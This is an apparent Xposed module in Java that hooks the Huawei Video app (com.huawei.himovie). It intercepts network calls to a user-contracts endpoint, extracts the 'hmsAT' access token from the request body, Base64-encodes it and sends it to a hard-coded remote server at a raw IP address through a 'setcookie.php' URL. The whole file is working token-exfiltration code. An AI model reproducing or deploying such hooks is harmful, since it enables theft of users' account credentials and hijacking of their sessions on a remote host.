package com.example.himoviehook;

import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;

public class HookMain implements IXposedHookLoadPackage {
    private static final String TAG = "HiMovieHook";

    @Override
    public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
        if (!lpparam.packageName.equals("com.huawei.himovie")) return;
        Log.i(TAG, "Hooking com.huawei.himovie");
        hookOkHttp(lpparam);
        hookHttpURLConnection(lpparam);
    }

    private void hookOkHttp(XC_LoadPackage.LoadPackageParam lpparam) {
        try {
            Class<?> requestClass = lpparam.classLoader.loadClass("okhttp3.Request");
            findAndHookMethod("okhttp3.OkHttpClient", lpparam.classLoader, "newCall", requestClass, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    Object request = param.args[0];
                    String url = requestClass.getMethod("url").invoke(request).toString();
                    if (url.contains("/poservice/getUserContracts?")) {
                        Log.i(TAG, "OkHttp Intercepted URL: " + url);
                        Object body = requestClass.getMethod("body").invoke(request);
                        if (body != null) {
                            okhttp3.RequestBody requestBody = (okhttp3.RequestBody) body;
                            okio.Buffer buffer = new okio.Buffer();
                            requestBody.writeTo(buffer);
                            String bodyString = buffer.readUtf8();
                            handleHmsAT(bodyString);
                        }
                    }
                }
            });
        } catch (Exception e) { Log.e(TAG, "OkHttp hook failed", e); }
    }

    private void hookHttpURLConnection(XC_LoadPackage.LoadPackageParam lpparam) {
        try {
            findAndHookMethod("java.net.HttpURLConnection", lpparam.classLoader, "connect", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    HttpURLConnection conn = (HttpURLConnection) param.thisObject;
                    String url = conn.getURL().toString();
                    if (url.contains("/poservice/getUserContracts?")) {
                        Log.i(TAG, "HttpURLConnection Intercepted URL: " + url);
                        try {
                            conn.setDoOutput(true);
                            OutputStream os = conn.getOutputStream();
                            if (os != null) {
                                InputStream is = conn.getInputStream();
                                byte[] buffer = new byte[is.available()];
                                is.read(buffer);
                                String bodyString = new String(buffer);
                                handleHmsAT(bodyString);
                            }
                        } catch (Exception ignored) {}
                    }
                }
            });
        } catch (Exception e) { Log.e(TAG, "HttpURLConnection hook failed", e); }
    }

    private void handleHmsAT(String bodyString) {
        try {
            JSONObject json = new JSONObject(bodyString);
            String hmsAT = json.getString("hmsAT");
            String hmsAT_value = android.util.Base64.encodeToString(hmsAT.getBytes(), android.util.Base64.NO_WRAP);
            new Thread(() -> {
                try {
                    URL url1 = new URL("http://8.140.20.143:10443/cookie/setcookie.php?v=hw&t=" + hmsAT_value);
                    HttpURLConnection conn = (HttpURLConnection) url1.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    conn.connect();
                    Log.i(TAG, "Remote response code: " + conn.getResponseCode());
                    conn.disconnect();
                } catch (Exception e) { Log.e(TAG, "Error sending to remote", e); }
            }).start();
        } catch (Exception e) { Log.e(TAG, "handleHmsAT failed", e); }
    }
}
